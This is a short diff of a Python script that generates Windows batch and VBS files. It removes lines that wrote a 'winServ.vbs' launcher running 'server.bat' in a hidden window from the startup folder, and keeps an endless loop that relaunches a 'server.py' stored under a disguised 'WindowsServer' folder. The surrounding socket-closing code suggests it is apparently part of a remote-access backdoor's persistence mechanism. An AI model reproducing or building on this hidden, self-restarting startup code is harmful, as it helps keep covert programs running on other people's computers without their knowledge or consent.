@@ -64,12 +64,9 @@ client.close()
 conn.close()
 
 '''
-batch_content = fr'''del "{startup_path}\winServ.vbs"
-:loop
+batch_content = fr''':loop
 "{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"
-goto loop
-echo set code = CreateObject("WScript.shell")>winServ.vbs
-echo code.Run "C:/Users/{user}/WindowsServer/server.bat",0,False>>winServ.vbs'''
+goto loop'''
 
 
 vbs_content = fr'''
